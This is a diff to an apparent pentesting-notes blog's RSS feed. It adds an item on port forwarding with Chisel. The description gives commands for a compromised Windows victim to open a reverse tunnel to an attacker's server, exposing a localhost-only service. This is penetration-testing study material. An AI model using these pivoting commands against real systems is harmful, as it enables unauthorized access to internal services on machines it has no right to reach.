@@ -14,5 +14,12 @@
       <guid>https://kdbed.github.io/posts/pentest_ssh/</guid>
       <description>Pentesting SSH ssh-audit Install&#xA;sudo apt install ssh-audit </description>
     </item>
+    <item>
+      <title>Port Forwarding</title>
+      <link>https://kdbed.github.io/posts/port_forwarding/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/port_forwarding/</guid>
+      <description>Port Forwarding Chisel Compromised windows machine &amp;ndash; service hosted only at 127.0.0.1 &amp;ndash; attacker machine is server and victim machine is client:&#xA;1 2 3 4 # attacker chisel server --socks5 --reverse -p 1234 # windows victim chiselx86_64.exe client &amp;lt;attacker ip&amp;gt;:1234 R:9090:127.0.0.1:9090 </description>
+    </item>
   </channel>
 </rss>
